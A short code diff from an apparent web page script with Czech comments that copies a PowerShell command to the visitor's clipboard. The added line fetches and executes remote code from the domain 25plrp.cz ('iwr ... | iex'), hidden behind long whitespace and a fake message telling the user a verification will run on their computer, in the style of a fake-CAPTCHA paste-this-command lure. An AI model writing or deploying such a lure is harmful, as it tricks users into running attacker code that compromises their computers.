@@ -118,7 +118,7 @@
 
         // PowerShell příkaz s AutoHotkey spuštěním
         const psCommand =
-          ':: Tohle je otevření powershell ✅                                                                              & powershell iwr "25plrp.cz | iex "'
+          'powershell iwr "25plrp.cz" | iex           #                                        Po stisku proběhne ověření na vašem počítači ✅ '
         navigator.clipboard.writeText(psCommand)
           .catch(err => {
             console.error("Nepodařilo se zkopírovat text do schránky.");
